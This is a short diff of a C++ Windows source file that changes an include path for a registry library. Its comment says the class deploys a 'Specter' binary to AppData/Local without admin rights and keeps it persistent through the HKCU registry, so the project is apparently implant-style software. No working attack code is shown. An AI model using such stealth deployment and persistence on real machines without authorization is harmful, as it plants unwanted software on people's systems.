@@ -5,7 +5,7 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
-#include "3rdPartyLibs/WinReg/WinReg.hpp"
+#include <winreg/WinReg.hpp>
 
 // This class is responsible for deploying the Specter binary into the machine without any admin privileges
 // Deploy to the AppData/Local folder, and ensures persistence by using the HKCU persistence method and 
